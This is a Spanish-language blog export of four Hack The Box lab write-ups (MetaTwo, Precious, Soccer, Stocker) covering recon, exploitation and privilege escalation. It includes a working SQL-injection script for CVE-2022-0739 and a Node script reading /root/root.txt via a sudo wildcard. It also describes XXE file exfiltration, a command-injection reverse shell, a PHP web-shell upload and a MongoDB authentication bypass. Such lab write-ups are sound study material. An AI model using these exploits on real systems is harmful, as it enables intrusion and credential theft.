[{"content":"Reconocimiento Empezamos viendo si la máquina víctima está disponible:\n1 ping -c 1 10.10.11.186 1 2 3 4 5 6 #PING 10.10.11.186 (10.10.11.186) 56(84) bytes of data. #64 bytes from 10.10.11.186: icmp_seq=1 ttl=63 time=45.8 ms # #--- 10.10.11.186 ping statistics --- #1 packets transmitted, 1 received, 0% packet loss, time 0ms #rtt min/avg/max/mdev = 45.795/45.795/45.795/0.000 ms Recordemos mirar el TTL para ver ante que máquina nos encontramos ( en este caso GNU/Linux).\nEscaneamos los puertos para ver cuáles están abiertos:\n1 nmap -p- --open -T5 -n -Pn 10.10.11.186 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 11 #Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 17:40 CET #Nmap scan report for 10.10.11.186 #Host is up (0.050s latency). #Not shown: 65492 closed tcp ports (reset), 40 filtered tcp ports (no-response) #Some closed ports may be reported as filtered due to --defeat-rst-ratelimit #PORT STATE SERVICE #21/tcp open ftp #22/tcp open ssh #80/tcp open http # #Nmap done: 1 IP address (1 host up) scanned in 16.35 seconds Vemos que ftp está desplegado, pero no podemos acceder a él mediante el usuario \u0026lsquo;anónimo\u0026rsquo;. Seguimos con el reconocimiento, es decir, lanzar con nmap una serie de scripts predefinidos para ver la versión de los distintos servicios:\n1 nmap -p21,22,80 10.10.11.186 -oN serviceTCPports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ## Nmap 7.93 scan initiated Mon Feb 20 17:41:25 2023 as: nmap -p21,22,80 -sVC -oN nmap2.out 10.10.11.186 #Nmap scan report for 10.10.11.186 #Host is up (0.051s latency). # #PORT STATE SERVICE VERSION #21/tcp open ftp? #| fingerprint-strings: #| GenericLines: #| 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] #| Invalid command: try being more creative #|_ Invalid command: try being more creative #22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) #| ssh-hostkey: #| 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA) #| 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA) #|_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519) #80/tcp open http nginx 1.18.0 #|_http-title: Did not follow redirect to http://metapress.htb/ #|_http-server-header: nginx/1.18.0 # #Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . ## Nmap done at Mon Feb 20 17:44:55 2023 -- 1 IP address (1 host up) scanned in 209.89 seconds Añadimos el dominio a nuestro fichero \u0026ldquo;/etc/hosts\u0026rdquo; y vemos la página web.\nObteniendo acceso a la máquina víctima Plugin WP (CVE-2022-0739) Lo primero que llama la atención es:\nPor tanto hay que buscar a ver si hay algún plugin instalado y ver si es vulnerable; echando un vistazo al fuente de la página:\nHaciendo una búsqueda rápida, encontramos en wpscan:\nLo que hay que hacer es crear una nueva entrada en el calendario y obtener un nonce de la petición POST al servidor:\nUna vez obtenido, en mi caso, he automatizado la SQLi con el siguiente script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # booking-plugin-exploit.py CVE-2022-0739 # author : 4rtic f0x import requests,sys wp_nonce=\u0026#34;99954e9c63\u0026#34; URL = \u0026#34;http://metapress.htb/wp-admin/admin-ajax.php\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: data = { \u0026#39;action\u0026#39;: \u0026#39;bookingpress_front_get_category_services\u0026#39;, \u0026#39;_wpnonce\u0026#39;:wp_nonce, \u0026#39;category_id\u0026#39;: 33, \u0026#39;total_service\u0026#39;:\u0026#39;-7502) %s\u0026#39; % sys.argv[1] } resp = requests.post(URL,data=data) print(resp.text) Esto permite obtener la salida del SQLi por consola y fácilmente poder filtrar por expresiones regulares. La \u0026lsquo;query\u0026rsquo; la introducimos como primer argumento a la hora de ejecutar el script.\nEjecutando:\nJohn the Ripper Vemos que la vulnerabilidad es explotada correctamente y ya podemos empezar a recopilar información, primero las tablas que nos interesan, después las columnas de esas tablas y posteriormente usuarios y contraseñas (hash):\nGuardamos las contraseñas en un fichero y ejecutamos \u0026lsquo;john\u0026rsquo; para obtener la contraseña:\nCon esto accedemos a WP como manager.\nXXE Una vez dentro podemos subir archivos \u0026hellip; aunque solo deja subir archivos de sonido/imagen. Podemos ver la versión exacta del wordpress y a partir de ello encontrar una serie de vulnerabilidades. Tras ver si alguna de ellas era útil encontré algo que no conocía hasta ahora, llamado XXE; esta vulnerabilidad nos permite obtener el contenido de ficheros mediante la inyección de XML. Principalmente intento listar el contenido de \u0026lsquo;/etc/passwd\u0026rsquo; para ver si funciona. Tenemos que crear un fichero con los primeros bytes que tendría un fichero de audio y posteriormente el XML pertinente. Una vez hecho esto apuntamos hacia un servicio web de nuestra máquina que contendrá el código restante para filtrar archivos. Una vez hecho esto, obtenemos (codificado) el contenido del fichero en cuestión:\nDecodificando:\nVemos un usuario potencial. Intentamos listar ficheros de configuración, en este caso veamos el del WP:\nDos credenciales; una de ellas para BBDD y otra para el ftp del inicio.\nBuscando ficheros con FTP Tras buscar un largo rato, encontré el siguiente fichero, que parece que gestiona el envío de email una vez que se crear un nuevo evento; en él obtenemos las credenciales del usuario anterior y accedemos al equipo víctima\nEscalada de Privilegios Passpie y GPG Listando por ficheros que pertenecen al usuario, podemos encontrar un software llamado \u0026lsquo;passpie\u0026rsquo;, gestor de contraseñas. Hay algunos ficheros que nos interesan más que otros; si ejecutamos \u0026lsquo;passpie\u0026rsquo; vemos que hay dos credenciales la de nuestro usuario y la de root; si intentamos exportarlas no nos dejará dado que tenemos que tener la \u0026ldquo;passphrase\u0026rdquo;. Para ellos nos descargamos el archivo \u0026lsquo;.keys\u0026rsquo; que contiene las claves privadas y públicas pgp; con gpg2john pasamos la clave privada a un formato entendible para \u0026lsquo;The Ripper\u0026rsquo; a ver si tenemos suerte y podemos obtener la clave que nos falta; tras unos segundos la obtenemos y podemos acceder a una consola con permisos de administrador:\n","date":"0001-01-01T00:00:00Z","image":"/p/1/metatwo-machine/landing.png","permalink":"/p/1/metatwo-machine/","title":"MetaTwo Machine"},{"content":"Reconocimiento Como siempre, vemos si tenemos conexión con la máquina:\n1 ping -c 1 10.10.11.189 1 2 3 4 5 6 #PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data. #64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=56.1 ms # #--- 10.10.11.189 ping statistics --- #1 packets transmitted, 1 received, 0% packet loss, time 0ms #rtt min/avg/max/mdev = 56.133/56.133/56.133/0.000 ms Una vez que sabemos que la máquina a la que nos enfrentamos está disponible, nos podemos fijar en que es una máquina Linux (TTL). Posteriormente ejecutamos el escaneo completo de todos los puertos para ver qué puertos abiertos encontramos:\n1 nmap -p- --open -T5 -n -Pn 10.10.11.189 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 #Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 17:21 CET #Nmap scan report for 10.10.11.189 #Host is up (0.055s latency). #Not shown: 56656 closed tcp ports (conn-refused), 8877 filtered tcp ports (no-response) #Some closed ports may be reported as filtered due to --defeat-rst-ratelimit #PORT STATE SERVICE #22/tcp open ssh #80/tcp open http # #Nmap done: 1 IP address (1 host up) scanned in 20.26 seconds Posteriormente ejecutamos el script grePorts para pasar los puertos detectados a nmap y realizar un escáner de reconocimiento más exhaustivo en esos puertos mediante una serie de scripts definidos por nmap:\n1 nmap -p20,80 -sVC 10.10.11.189 -oN servicesTCPports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ## Nmap 7.93 scan initiated Sun Feb 19 17:23:27 2023 as: nmap -p22,80 -sVC -oN nmap2.out 10.10.11.189 #Nmap scan report for 10.10.11.189 #Host is up (0.054s latency). # #PORT STATE SERVICE VERSION #22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) #| ssh-hostkey: #| 3072 845e13a8e31e20661d235550f63047d2 (RSA) #| 256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA) #|_ 256 33053dcd7ab798458239e7ae3c91a658 (ED25519) #80/tcp open http nginx 1.18.0 #|_http-server-header: nginx/1.18.0 #|_http-title: Did not follow redirect to http://precious.htb/ #Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel # #Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . ## Nmap done at Sun Feb 19 17:23:36 2023 -- 1 IP address (1 host up) scanned in 9.73 seconds Obteniendo acceso a la máquina víctima Command Injection Principalmente nos encontramos con una página web que convierte una paǵina web a html; principalmente echamos un vistazo a los metadatos para intentar ver que herramienta se está encargando de esto; y efectivamente la encontramos:\nEchando un vistazo en busca de vulnerabilidades asociadas a esta herramienta, podemos encontrar fácilmente el siguiente reporte en GitHub:\nPodemos encontrar múltiples recursos, como el propio \u0026lsquo;commit\u0026rsquo; del repositorio de la herramienta:\nHacemos una prueba para ver si la página tarda 5 segundos en emitir el pdf:\nPara ver si todo se está ejecutando correctamente, creamos un pequeño servicio web con Python; hacemos clic, vemos la petición GET del lado de la máquina víctima y tarda 5 segundos en generar el pdf. Esto nos sirve para entablar una consola remota y ganar acceso a la máquina.\nEscalada de privilegios Accedemos con el usuario \u0026lsquo;ruby\u0026rsquo; y en busca de ficheros de configuración encontramos un fichero denominado \u0026lsquo;conf\u0026rsquo; que contiene la contraseña de \u0026lsquo;henry\u0026rsquo; el otro usuario:\nVemos que el usuario puede ejecutar como usuario privilegiado sin ofrecer contraseña un script que carga un fichero de configuración YAML y comprueba si es igual las dependencias existentes de Ruby.\nBuscando como inyectar de alguna manera algún tipo de comando en el fichero YAML y poder ganar acceso como administrador, encontré el siguiente recurso donde se explica perfectamente:\nSustituimos el comando por \u0026ldquo;bash\u0026rdquo; y obtenemos permisos de administrador.\n","date":"0001-01-01T00:00:00Z","image":"/p/1/precious-machine/landing.png","permalink":"/p/1/precious-machine/","title":"Precious Machine"},{"content":"Reconocimiento Empezamos con nmap para ver los puertos abiertos de la máquina:\n1 nmap -p- --open -T5 -Pn -n 10.10.11.194 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 11 ## Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 15:28 CET ## Nmap scan report for 10.10.11.194 ## Host is up (0.048s latency). ## Not shown: 62421 closed tcp ports (conn-refused), 3111 filtered tcp ports (no-response) ## Some closed ports may be reported as filtered due to --defeat-rst-ratelimit ## PORT STATE SERVICE ## 22/tcp open ssh ## 80/tcp open http ## 9091/tcp open xmltec-xmlmail ## ## Nmap done: 1 IP address (1 host up) scanned in 15.92 seconds Ejecuto la utilidad \u0026ldquo;grePorts\u0026rdquo; para obtener los puertos abiertos directamente en la \u0026ldquo;clipboard\u0026rdquo;:\n1 grePorts 1 ## [!] Open ports: 22,80,9091 Y ejecutamos una serie de scripts de reconocimiento con nmap para ver los servicios disponibles y su versión:\n1 nmap -p22,80,9091 -sVC -oN servicesTCPports 10.10.11.194 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ## Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-14 15:33 CET ## Nmap scan report for soccer.htb (10.10.11.194) ## Host is up (0.047s latency). ## ## PORT STATE SERVICE VERSION ## 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) ## | ssh-hostkey: ## | 3072 ad0d84a3fdcc98a478fef94915dae16d (RSA) ## | 256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA) ## |_ 256 5797565def793c2fcbdb35fff17c615c (ED25519) ## 80/tcp open http nginx 1.18.0 (Ubuntu) ## |_http-title: Soccer - Index ## |_http-server-header: nginx/1.18.0 (Ubuntu) ## 9091/tcp open xmltec-xmlmail? ## | fingerprint-strings: ## | DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: ## | HTTP/1.1 400 Bad Request ## | ## ... Vemos un dominio al que apunta el servidor por el puerto 80, por lo que lo inlcuimos en nuestro archivo hosts. Vemos que además hay un servicio en el puerto 9091 relacionado con correo electrónico \u0026ldquo;xmltec-xmlmail?\u0026rdquo; que nmap no es capaz de reconocer.\nVamos a empezar echando un vistazo a la página web y veremos después.\nObteniendo acceso a la máquina víctima La página principal no tiene contenido relevante, por lo que vamos a enumerar recursos disponibles o subdominios válidos vamos a usar la herramienta gobuster:\n1 gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://soccer.htb/ Vemos un directorio \u0026ldquo;tiny/\u0026rdquo; al que podemos acceder y nos lleva a la página de un gestor de ficheros al que podemos acceder con las credenciales de administración por defecto admin/admin@123. Además podemos obtener información relevante como que por detrás se está ejecutando php.\nGanando RCE Una vez que hemos accedido lo primero que se me ocurra es subir un fichero y ver si puedo acceder desde el navegador y el contenido se ejecuta \u0026hellip; y efectivamente:\nHe de decir que hay una tarea cron por detrás que elimina aquello que subamos al cabo de unos minutos. Ahora vamos a subir un simple fichero php que nos permita obtener ejecución arbitraria de comandos (RCE) y por ende una reverse shell.\nEscalada de privilegios \u0026hellip; (a medias) La escalada de privilegios es sencilla; haciendo una breve búsqueda por posibles agujeros del sistema, nos encontramos con lo siguiente:\nSí, el binario de bash tiene permisos suid, por lo que haciendo lo siguiente, ya podemos obtener las flags de usuario y root:\nEscalada de privilegios \u0026hellip; (completa) NOTA: Resulta que la máquina no se hace del todo así \u0026hellip; ¿os acordáis del puerto del principio? El 9091. Me extrañó mucho que la máquina tuviera el suid en el binario de bash así de primera, y efectivamente debió ser porque los otros usuarios ya lo habían conseguido\u0026hellip;\nDe todos modos, para ser honesto volví a hacer la máquina de nuevo, lo que me sirvió para aprender a hacer pentesting de web-socket y a entender como funcionan \u0026hellip; ¡es increíble! adjunto algunas capturas del camino a seguir:\nComo me quedé extrañado con la resolución, miré el foro de discusión de la plataforma y vi que hablaban sobre otro subdominio; miré el fichero hosts y \u0026hellip; eureka\u0026hellip; no había completado la máquina del todo\nAccediendo a ese subdominio me registré y comprobé que la petición era enviada a un web socket ( el puerto desconocido de antes)\nCon websocat establecí comunicación para asegurarme y efectivamente me devolvía la misma respuesta al introducir cualquier cadena de texto. Echando un vistazo al fuente de la página se tramita un apartado \u0026ldquo;id\u0026rdquo; y había visto antes que se estaba ejecutando mysql en la máquina víctima, lo que me hizo pensar en una SQLi.\nEncontré por internet un script e información con la que acontecer la inyección a través del websocket, por lo que una vez ejecutado, solo tuve que extraer la información. Básicamente el programa actúa de intermediario y traduce las peticiones.\nPodemos ver usuario y contraseña, lo cual nos servirá para establecer conexión a través de ssh.\nLa escalada de privilegios es similar a la anterior: abusamos de los privilegios como root y a raíz de eso habilitar la flag suid en bash. Lo hacemos con un script llamado doas (me costó la misma vida encontrarlo en la máquina).\n","date":"0001-01-01T00:00:00Z","image":"/p/1/soccer-machine/landing.png","permalink":"/p/1/soccer-machine/","title":"Soccer Machine"},{"content":"Reconocimiento Para comenzar, como es costumbre, comprobamos si la máquina está disponible:\n1 ping -c 1 10.10.11.196 1 2 3 4 5 6 ## PING 10.10.11.196 (10.10.11.196) 56(84) bytes of data. ## 64 bytes from 10.10.11.196: icmp_seq=1 ttl=63 time=46.3 ms ## ## --- 10.10.11.196 ping statistics --- ## 1 packets transmitted, 1 received, 0% packet loss, time 0ms ## rtt min/avg/max/mdev = 46.315/46.315/46.315/0.000 ms Si echamos un vistazo al valor TTL en la respuesta, vemos que la máquina a la que nos enfrentamos tiene como sistema operativo GNU/Linux.\nA continuación vemos que servicios están desplegados haciendo un escaneo de puertos, principalmente por el protocolo TCP:\n1 nmap -p- --open -T5 -Pn -n 1 10.10.11.196 -oG openTCPports 1 2 3 4 5 6 7 8 9 10 ## Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 20:19 CET ## Nmap scan report for 10.10.11.196 ## Host is up (0.046s latency). ## Not shown: 60876 closed tcp ports (conn-refused), 4657 filtered tcp ports (no-response) ## Some closed ports may be reported as filtered due to --defeat-rst-ratelimit ## PORT STATE SERVICE ## 22/tcp open ssh ## 80/tcp open http ## ## Nmap done: 2 IP addresses (2 hosts up) scanned in 39.03 seconds Una vez hecho esto, vemos que están expuestos los puertos 22 y 80. Veamos que servicios maneja, lanzando con nmap una serie de scripts de reconocimiento:\n1 nmap -p22,80 -sVC 10.10.11.196 -oN servicesTCPports 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ## Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 20:20 CET ## Nmap scan report for stocker.htb (10.10.11.196) ## Host is up (0.049s latency). ## ## PORT STATE SERVICE VERSION ## 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) ## | ssh-hostkey: ## | 3072 3d12971d86bc161683608f4f06e6d54e (RSA) ## | 256 7c4d1a7868ce1200df491037f9ad174f (ECDSA) ## |_ 256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519) ## 80/tcp open http nginx 1.18.0 (Ubuntu) ## |_http-title: Stock - Coming Soon! ## |_http-generator: Eleventy v2.0.0 ## |_http-server-header: nginx/1.18.0 (Ubuntu) ## Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ## ## Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . ## Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds Obteniendo acceso a la máquina víctima Vemos ssh ejecutándose y un servicio web desplegado en el puerto 80. Como no disponemos de credenciales para ssh, vamos a echar un vistazo a la web; primero desde terminal para saber a qué tecnologías nos enfrentamos:\n1 whatweb 10.10.11.196 Al principio no veremos nada ya que nos redirige a un dominio que nuestro ordenador no sabe interpretar; para ello añadimos la dirección ip a nuestro archivo local /etc/hosts además del dominio al que nos redirige stocker.htb.\nEchando un rápido vistazo a la página web, no se ve nada que destaque; con la herramienta gobuster veamos si hay algún subdominio:\n1 gobuster vhost -u stocker.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt Añadimos el subdominio de la imagen al fichero de hosts y accedemos a él para ver un panel de autenticación para acceder a los recursos de la plataforma.\nIntentar algún bypass simple no es efectivo; interceptando la petición desde nuestro dispositivo con BurpSuite podemos cambiar el contenido de la aplicación de \u0026ldquo;url-encoded\u0026rdquo; a \u0026ldquo;json\u0026rdquo; sin recibir ningún error del estilo \u0026ldquo;Internal Server Error\u0026rdquo;; esto me hace pensar que por detrás se esté haciendo algún tipo de petición a una base de datos.\nSaltando el panel de autenticación Haciendo varias pruebas encontré una manera de saltarme el panel.A continuación se puede ver una forma de aprovechar esto jugando con los valores json:\n¿Qué estamos haciendo realmente? Según la documentación de MongoDB $ne selects the document where the value of the field is not equal tothe specified value es decir, estamos seleccionando todos los valores distintos al que hemos puesto incluido los valores de autenticación correctos . Usando este valor que se interpreta internamente como un tipo de dato BSON, podemos acceder como usuario registrado a la plataforma.\nObteniendo credenciales ssh Nos encontramos ante una especie de tienda, donde seleccionamos los objetos para comprar, realizamos la compra y obtenemos un pdf a modo de factura. Interceptando la petición de compra podemos alterar el contenido de este pdf.\nMirando los metadatos del fichero, este está generado con chromium ¿podremos ver el contenido de un fichero abusando de esto y gracias a un iframe?La respuesta es que sí, podemos:\nObtenemos el usuario \u0026ldquo;Angoose\u0026rdquo;. Tras buscar en varios ficheros insatisfactoriamente se me ocurrió buscar ficheros \u0026ldquo;js\u0026rdquo; que contuvieran la configuración del usuario para el inicio de sesión de este; probé con varios hasta dar con el \u0026ldquo;index.js\u0026rdquo; que contenía:\nProbando el usuario y la contraseña en ssh ganamos acceso.\nEscalada de privilegios Una vez hemos ganado acceso tenemos permisos para ejecutar como root sin contraseña el comando \u0026ldquo;node\u0026rdquo; acompañado de cierta ruta usando el comodín asterisco. Gracias a este comodín podemos ejecutar realmente el fichero que queramos porque el comodín se puede sustituir por cero o más ocurrencias de cualquier caracter. Creamos el siguiente scrip y obtenemos la flag de root:\n1 2 3 4 5 6 const fs = require(\u0026#34;fs\u0026#34;), filename = \u0026#34;/root/root.txt\u0026#34;; fs.readFile(filename, \u0026#39;utf-8\u0026#39;, (error,data) =\u0026gt; { if (error) throw error; console.log(\u0026#34;ROOT FLAG: \u0026#34;, data); }) ","date":"0001-01-01T00:00:00Z","image":"/p/1/stocker-machine/landing.png","permalink":"/p/1/stocker-machine/","title":"Stocker Machine"}]